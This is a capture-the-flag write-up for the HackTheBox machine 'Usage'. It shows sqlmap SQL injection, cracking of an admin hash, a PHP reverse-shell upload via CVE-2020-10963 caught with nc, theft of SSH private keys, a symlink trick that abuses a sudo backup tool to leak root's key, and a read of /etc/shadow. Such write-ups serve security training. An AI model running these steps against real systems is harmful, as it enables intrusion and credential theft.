# Usage - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Usage.JPG](images/Usage.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, and `80`.

***User***: Discovered an SQL Injection vulnerability on [http://admin.usage.htb/](http://admin.usage.htb/). Using this, we obtained credentials and exploited `CVE-2020-10963` to gain a reverse shell as the `dash` user.

***Root***: Found a `.monitrc` file containing the credentials for the `xander` user. Running `sudo -l`, we found the binary `/usr/bin/usage_management`, which backs up the contents of `/var/www/html`, a directory we have write access to. We created a symlink to the `root` SSH key in this directory, ran the backup binary, and retrieved the `root` SSH key.

![pwn.JPG](images/pwn.JPG)


## Usage Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ nmap -sV -sC -oA nmap/Usage 10.10.11.18
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-13 23:48 IDT
Nmap scan report for 10.10.11.18
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0f8fdd304b807a063dd37dfd7eeca78 (ECDSA)
|_  256 bd22f5287727fb65baf6fd2f10c7828f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

By clicking on the `Admin` button, we are navigated to [http://admin.usage.htb/](http://admin.usage.htb/).

Inspecting the HTML, we can see that it is `laravel-admin`, but credentials are required.

By clicking on `Reset Password`, we are directed to the following page:

![reset.JPG](images/reset.JPG)

The following HTTP request is sent:
```console
POST /forget-password HTTP/1.1
Host: usage.htb
Content-Length: 71
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://usage.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://usage.htb/forget-password
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: XSRF-TOKEN=eyJpdiI6Im5KU1k0SytnVjd6T2J6a25lekl1M1E9PSIsInZhbHVlIjoiVjNST3dDWlZnaUM4M2FEbC9JRkMxYWhaUUx0N1hYVXJGeDEwbG9DZUlCQ2VRWGRIOStCRDFRaGZuMExOVExMOThmL29XYS9sYnZSeksybm9WODlPY1MwSE05bE1lTGh2WDdCd2xqZTQ5RXE3RnhHSkZGckxDVWUzMTQiLCJtYWMiOiIwNWU3OTcwMDYwMmM2OTYwM2Y0Y2U2NmI2YzI0MTEyZjM4OGQ0MDNmMTQxMmQwMTYxNjgwNmY5ZjI0NzJmMDJlIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IitvSWpKTHZweXkzL1d0OG96bEhscEE9PSIsInZhbHVlIjoiUWVNSjdxcFBpR3ZTZmYyUEo0R0pJQ00reWxBMFdGMktWTjFpdERlYnM2bWV0NmxBYi9hMnJhVDF2SG9tUmlHaGZzZ2ZLTmVVWUQ0L0krVFhZMWtIcStBRWNRSVRKdXFtcXVwQkMxcDkxSTNxbVZJU3RiMEVYd1gySVMiLCJtYWMiOiI2MmI3NmNjZDhkYzUyNGUyOGRlM2YxOWYxZjA2NzFlODBlMGNjZmU1OGIyODExMzMzZjljOWVkYzkyMGMzNmJiIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=4dQgVxXy4KEhghzuFeVRkslpa64dadlggGM7cbWF&email=admin%40usage.htb
```

Let's use `sqlmap` to check for SQL Injection vulnerabilities:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ sqlmap -r req -p email --level 5 --risk 3 --batch --threads 10 --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:11:43 /2024-07-14/

[00:11:43] [INFO] parsing HTTP request from 'req'
[00:11:43] [INFO] testing connection to the target URL
got a 302 redirect to 'http://usage.htb/forget-password'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
[00:11:44] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[00:11:44] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[00:11:45] [INFO] testing for SQL injection on POST parameter 'email'
[00:11:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
...
[00:15:42] [INFO] retrieved: 18
[00:15:52] [INFO] retrieved: performance_schema             
[00:15:52] [INFO] retrieving the length of query output
[00:15:52] [INFO] retrieved: 10
[00:15:58] [INFO] retrieved: usage_blog             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] usage_blog

```

Let's try to inspect the `usage_blog` database:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ sqlmap -r req -p email --level 5 --risk 3 --batch --threads 10 -D usage_blog --tables
...
Database: usage_blog
[15 tables]
+------------------------+
| admin_menu             |
| admin_operation_log    |
| admin_permissions      |
| admin_role_menu        |
| admin_role_permissions |
| admin_role_users       |
| admin_roles            |
| admin_user_permissions |
| admin_users            |
| blog                   |
| failed_jobs            |
| migrations             |
| password_reset_tokens  |
| personal_access_tokens |
| users                  |
+------------------------+

```

By inspecting the `admin_users` table, we found the following information:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ sqlmap -r req -p email --level 5 --risk 3 --batch --threads 10 -D usage_blog -T admin_users --dump
...
Database: usage_blog
Table: admin_users
[1 entry]
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+

```

By cracking the hash using `john`, we obtained the password `whatever1`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt  hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whatever1        (?)
1g 0:00:00:11 DONE (2024-07-14 00:27) 0.08438g/s 136.7p/s 136.7c/s 136.7C/s alexis1..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

These credentials (`admin:whatever1`) work for `laravel-admin`:

![dashboard.JPG](images/dashboard.JPG)

We can use `CVE-2020-10963` to upload a profile picture as a PHP web shell. You can obtain the PHP web shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

To do this, click on `Users` in the left menu, then click on the `Edit` button:

![users.JPG](images/users.JPG)

Next, we need to upload the PHP reverse shell file:

![shell.JPG](images/shell.JPG)

Modify the HTTP request (using `Burp`) to change the file name:

![burp.JPG](images/burp.JPG)

Now, access our reverse shell at [http://admin.usage.htb/uploads/images/shell.php](http://admin.usage.htb/uploads/images/shell.php) to gain a reverse shell:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from usage.htb [10.10.11.18] 59836
Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 20:44:37 up 28 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(dash) gid=1000(dash) groups=1000(dash)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
dash
$ ls -ltra /home
total 16
drwxr-xr-x  4 root   root   4096 Aug 16  2023 .
drwxr-x---  4 xander xander 4096 Apr  2 20:25 xander
drwxr-xr-x 19 root   root   4096 Apr  2 21:15 ..
drwxr-x---  6 dash   dash   4096 Jul 21 20:50 dash
$ pwd
/
$ cat /home/dash/user.txt
3ec381f28e4324ae087c94ad8f071140
```

And we get the user flag `3ec381f28e4324ae087c94ad8f071140`.


### Root

By running `cat /home/dash/.ssh/id_rsa`, we obtain the following SSH key:
```console
$ cat /home/dash/.ssh/id_rsa	
-----BEGIN OPENSSH PRIVATE KEY-----
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
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----

```

Let's use it to connect to SSH as the `dash` user.

Upon enumerating the `dash` home directory, we find the following file: `.monitrc`:
```console
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert

```

The file contains the admin credentials for `monit`: `admin:3nc0d3d_pa$$w0rd`.

We can also use the same password for the `xander` user.

Running `sudo -l` shows that `xander` can execute the following commands as `root`:
```console
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Let's run the binary and select option `1`:
```console
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54861362

Scanning the drive:
2984 folders, 17949 files, 114774052 bytes (110 MiB)           

Updating archive: /var/backups/project.zip

Items to compress: 20933

                                                                               
Files read from disk: 17949
Archive size: 54861362 bytes (53 MiB)
Everything is Ok

```

During execution, we can see that it backs up the contents of `/var/www/html`.

We have write permissions to this folder:
```console
xander@usage:/var/www/html$ ls -ltra /var/www/
total 12
drwxr-xr-x 14 root root   4096 Apr  2 21:15 ..
drwxr-xr-x  3 root root   4096 Apr  2 21:15 .
drwxrwxrwx  4 root xander 4096 Jul 21 21:18 html
```

We can use `ln` to create a symlink to `/root/.ssh/id_rsa` in order to obtain the root SSH private key:
```console
xander@usage:/var/www/html$ touch @id_rsa
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ ll
total 16
drwxrwxrwx  4 root   xander 4096 Jul 21 21:20 ./
drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ../
lrwxrwxrwx  1 xander xander   17 Jul 21 21:20 id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15 project_admin/
drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15 usage_blog/
```

Run it again and select option `1`. Then, copy the file `/var/backups/project.zip` to `/tmp` and unzip it:
```console
xander@usage:/var/www/html$ touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ ll
total 16
drwxrwxrwx  4 root   xander 4096 Jul 21 21:23  ./
drwxr-xr-x  3 root   root   4096 Apr  2 21:15  ../
-rw-rw-r--  1 xander xander    0 Jul 21 21:23 '@id_rsa'
lrwxrwxrwx  1 xander xander   17 Jul 21 21:23  id_rsa -> /root/.ssh/id_rsa
drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15  project_admin/
drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15  usage_blog/

```

Run it again to obtain the root private SSH key:
```console
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7513 32-Core Processor                 (A00F11),ASM,AES-NI)

Open archive: /var/backups/project.zip
--       
Path = /var/backups/project.zip
Type = zip
Physical Size = 54861503

Scanning the drive:
          
WARNING: No more files
-----BEGIN OPENSSH PRIVATE KEY-----


WARNING: No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW


WARNING: No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi


WARNING: No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q


WARNING: No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs


WARNING: No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=


WARNING: No more files
-----END OPENSSH PRIVATE KEY-----

2984 folders, 17950 files, 114774451 bytes (110 MiB)

Updating archive: /var/backups/project.zip

Items to compress: 20934

                                                                               
Files read from disk: 17950
Archive size: 54861503 bytes (53 MiB)

Scan WARNINGS for files and folders:

-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
Scan WARNINGS: 7
```

Let's use this key to log in via SSH as `root`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= 
-----END OPENSSH PRIVATE KEY-----
┌─[evyatar9@parrot]─[/hackthebox/Usage]
└──╼ $ ssh -i root_id_rsa root@usage.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sun Jul 21 09:26:01 PM UTC 2024

  System load:           0.17138671875
  Usage of /:            69.6% of 6.53GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             233
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.18
  IPv6 address for eth0: dead:beef::250:56ff:fe94:2706


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~# cat root.txt 
e7938331aa85512006a2e2a6adf6277d

```

And we get the root flag `e7938331aa85512006a2e2a6adf6277d`.

PDF password:
```console
root@usage:~# cat /etc/shadow | grep root | cut -d':' -f2
$y$j9T$eHRVEjBacjX.aL3Dv.ayh/$ya7Anf39wpVrmChSihyT1sxtFg.2JLtN/z5oNXKDRc4
```